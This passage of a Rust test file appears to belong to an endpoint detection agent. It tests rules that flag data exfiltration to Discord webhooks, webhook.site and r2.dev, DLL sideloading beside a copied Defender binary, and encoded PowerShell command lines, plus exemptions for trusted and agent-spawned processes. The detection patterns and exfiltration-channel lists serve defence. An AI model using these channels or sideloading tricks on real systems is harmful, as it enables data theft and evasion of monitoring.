    assert!(e
        .process(&connect(2, "mb", 2, "13.107.42.14", 443))
        .is_empty());
}

#[test]
fn st14_exfil_domains_ports_and_owners() {
    let mut e = engine(Policy::default());
    unsigned_temp(&mut e, "x", 60);
    let out = e.process(&ev(
        1,
        "x",
        60,
        EventData::DnsQuery {
            qname: "discord.com".into(),
            answers: vec!["162.159.128.233".into()],
        },
    ));
    assert_eq!(
        rule_ids(&out),
        ["ST-14"],
        "discord.com/api/webhooks entry matches on host"
    );
    unsigned_temp(&mut e, "y", 61);
    let out = e.process(&connect(2, "y", 61, "34.120.5.6", 8545));
    assert!(first(&out, "ST-14").alert.summary.contains("8545"));
    unsigned_temp(&mut e, "z", 62);
    assert_eq!(
        rule_ids(&e.process(&ev(
            3,
            "z",
            62,
            EventData::DnsQuery {
                qname: "pub-1a2b3c.r2.dev".into(),
                answers: vec![]
            }
        ))),
        ["ST-14"]
    );
    // owners: Discord client and Telegram desktop talking to their own service
    e.process(&start(
        4,
        "dc",
        63,
        r"C:\Users\alice\AppData\Local\Discord\app-1.0.9170\Discord.exe",
        "Discord.exe",
        None,
        SignatureState::Valid,
        Some("Discord Inc."),
    ));
    assert!(e
        .process(&ev(
            5,
            "dc",
            63,
            EventData::DnsQuery {
                qname: "discord.com".into(),
                answers: vec![]
            }
        ))
        .is_empty());
    // a renamed copy in Temp does not get the owner exemption
    e.process(&start(
        6,
        "fakedc",
        64,
        r"C:\Users\alice\AppData\Local\Temp\Discord.exe",
        "Discord.exe",
        None,
        SignatureState::Unsigned,
        None,
    ));
    assert_eq!(
        rule_ids(&e.process(&ev(
            7,
            "fakedc",
            64,
            EventData::DnsQuery {
                qname: "discord.com".into(),
                answers: vec![]
            }
        ))),
        ["ST-14"]
    );
    // custom exfil list from policy
    let p = Policy {
        exfil_domains: vec!["https://webhook.site/".into()],
        ..Default::default()
    };
    e.update_policy(p);
    unsigned_temp(&mut e, "w", 65);
    assert_eq!(
        rule_ids(&e.process(&ev(
            8,
            "w",
            65,
            EventData::DnsQuery {
                qname: "webhook.site".into(),
                answers: vec![]
            }
        ))),
        ["ST-14"]
    );
    unsigned_temp(&mut e, "t", 66);
    assert!(
        e.process(&ev(
            9,
            "t",
            66,
            EventData::DnsQuery {
                qname: "api.telegram.org".into(),
                answers: vec![]
            }
        ))
        .is_empty(),
        "no longer listed"
    );
}

#[test]
fn st15_sideload() {
    let mut e = engine(Policy::default());
    let img = r"C:\Users\alice\AppData\Local\Temp\neo\MpCmdRun.exe";
    e.process(&start(
        0,
        "mp",
        70,
        img,
        "MpCmdRun.exe",
        None,
        SignatureState::Valid,
        Some("Microsoft Corporation"),
    ));
    let out = e.process(&ev(
        1,
        "mp",
        70,
        EventData::ImageLoad {
            path: r"C:\Users\alice\AppData\Local\Temp\neo\MpClient.dll".into(),
            signer: None,
            signed: SignatureState::Unsigned,
        },
    ));
    let d = first(&out, "ST-15");
    assert_eq!(d.alert.severity, Severity::High);
    let mut e = engine(policy_all(RuleMode::Protect));
    e.process(&start(
        0,
        "mp",
        70,
        img,
        "MpCmdRun.exe",
        None,
        SignatureState::Valid,
        Some("Microsoft Corporation"),
    ));
    let out = e.process(&ev(
        1,
        "mp",
        70,
        EventData::ImageLoad {
            path: r"C:\Users\alice\AppData\Local\Temp\neo\MpClient.dll".into(),
            signer: None,
            signed: SignatureState::Unsigned,
        },
    ));
    let d = first(&out, "ST-15");
    assert!(d.actions.contains(&ResponseAction::QuarantineFile {
        path: r"C:\Users\alice\AppData\Local\Temp\neo\MpClient.dll".into(),
        sha256: None
    }));
    // genuine Defender
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "mp",
        70,
        r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0\MpCmdRun.exe",
        "MpCmdRun.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    assert!(e.process(&ev(1, "mp", 70, EventData::ImageLoad { path: r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0\MpClient.dll".into(), signer: None, signed: SignatureState::Valid })).is_empty());
}

#[test]
fn st07_trusted_sources_are_quiet() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "tm",
        80,
        r"C:\Windows\System32\Taskmgr.exe",
        "taskmgr.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    let t = TargetProcess {
        target_pid: 7000,
        target_guid: None,
        target_image: CHROME_EXE.into(),
        granted_access: 0x1410,
        return_code: 0,
    };
    assert!(e
        .process(&ev(1, "tm", 80, EventData::ProcessAccess(t.clone())))
        .is_empty());
    e.process(&start(
        2,
        "pm",
        81,
        r"C:\Program Files\1Password\app\8\1Password.exe",
        "1Password.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    assert!(e
        .process(&ev(3, "pm", 81, EventData::ProcessAccess(t.clone())))
        .is_empty());
    // query-only access from an untrusted image is not enough
    unsigned_temp(&mut e, "q", 82);
    let q = TargetProcess {
        granted_access: 0x1000,
        return_code: 0,
        ..t
    };
    assert!(e
        .process(&ev(4, "q", 82, EventData::ProcessAccess(q)))
        .is_empty());
}

#[test]
fn process_table_through_engine() {
    let mut e = engine(Policy::default());
    e.process(&start(
        0,
        "a",
        1,
        r"C:\Windows\explorer.exe",
        "explorer.exe",
        None,
        SignatureState::Valid,
        None,
    ));
    e.process(&start(
        1,
        "b",
        2,
        r"C:\Windows\System32\cmd.exe",
        "cmd.exe",
        Some(("a", 1)),
        SignatureState::Valid,
        None,
    ));
    e.process(&start(
        2,
        "c",
        3,
        r"C:\Windows\System32\conhost.exe",
        "conhost.exe",
        Some(("b", 2)),
        SignatureState::Valid,
        None,
    ));
    assert_eq!(e.processes().len(), 3);
    assert_eq!(e.processes().by_pid(2).unwrap().guid, g("b"));
    assert_eq!(e.processes().descendants(&g("a")).len(), 2);
    assert_eq!(e.processes().ancestry(&g("c"), 6).len(), 2);
    e.process(&ev(
        3,
        "b",
        2,
        EventData::ProcessStop { exit_code: Some(0) },
    ));
    assert!(e.processes().by_pid(2).is_none());
    assert_eq!(e.processes().descendants(&g("a")).len(), 1, "live only");
    // retention: exited processes evicted after 10 minutes
    e.tick(T0 + 11 * 60_000);
    assert!(e.process_info(&g("b")).is_none());
    assert!(e.process_info(&g("a")).is_some());
}

/// Real-host regression (VM, 2026-10-21): the agent's own hardening checks run
/// `powershell.exe -EncodedCommand …`; SigmaHQ encoded-PowerShell rules fired
/// on every hardening pass. Children (and grandchildren) of the agent are the
/// agent's own work; the same command from a user shell still alerts.
#[test]
fn agent_children_are_not_subjects() {
    const ENC: &str = r#"
title: Encoded PowerShell (lab)
id: 11111111-2222-3333-4444-555555555555
logsource: { category: process_creation, product: windows }
detection:
  sel:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: ' -EncodedCommand '
  condition: sel
level: high
"#;
    let bundle = RuleBundle {
        version: 2,
        rules: vec![sigma_def("SIG-11111111", ENC)],
    };
    let mut e = Engine::new(host(), Policy::default(), bundle).unwrap();
    let ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
    let cmd = "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwAgADEA";
    e.process(&start(
        0,
        "agent",
        50,
        common::AGENT,
        "kestrel-agent.exe service",
        None,
        SignatureState::Valid,
        None,
    ));
    let out = e.process(&start(
        10,
        "hard",
        51,
        ps,
        cmd,
        Some(("agent", 50)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    assert!(rule_ids(&out).is_empty(), "agent child: {}", dump(&out));
    let out = e.process(&start(
        20,
        "grand",
        52,
        ps,
        cmd,
        Some(("hard", 51)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    assert!(
        rule_ids(&out).is_empty(),
        "agent grandchild: {}",
        dump(&out)
    );
    e.process(&start(
        30,
        "cmd",
        60,
        r"C:\Windows\System32\cmd.exe",
        "cmd.exe",
        None,
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    let out = e.process(&start(
        40,
        "user",
        61,
        ps,
        cmd,
        Some(("cmd", 60)),
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    assert_eq!(rule_ids(&out), ["SIG-11111111"], "{}", dump(&out));
}

/// Lab VM (2026-10-21): SigmaHQ `bdc64095` ("unsigned dbghelp/dbgcore
/// load", `Signed: 'false'`) fired on every System32 dbghelp.dll load, whose
/// signature the sensor had not verified. Unknown must not read as unsigned.
#[test]
fn sigma_unverified_signature_is_not_unsigned() {
    const R: &str = r#"
title: Unsigned dbghelp (lab)
id: 22222222-2222-3333-4444-555555555555
logsource: { category: image_load, product: windows }
detection:
  selection:
    ImageLoaded|endswith: '\dbghelp.dll'
    Signed: 'false'
  condition: selection
level: high
"#;
    let bundle = RuleBundle {
        version: 2,
        rules: vec![sigma_def("SIG-22222222", R)],
    };
    let mut e = Engine::new(host(), Policy::default(), bundle).unwrap();
    e.process(&start(
        0,
        "tel",
        80,
        r"C:\Windows\System32\CompatTelRunner.exe",
        "CompatTelRunner.exe",
        None,
        SignatureState::Valid,
        Some("Microsoft Windows"),
    ));
    let load = |signed| EventData::ImageLoad {
        path: r"C:\Windows\System32\dbghelp.dll".into(),
        signer: None,
        signed,
    };
    let out = e.process(&ev(10, "tel", 80, load(SignatureState::Unknown)));
    assert!(rule_ids(&out).is_empty(), "{}", dump(&out));
    let out = e.process(&ev(20, "tel", 80, load(SignatureState::Unsigned)));
    assert_eq!(rule_ids(&out), ["SIG-22222222"], "{}", dump(&out));
}
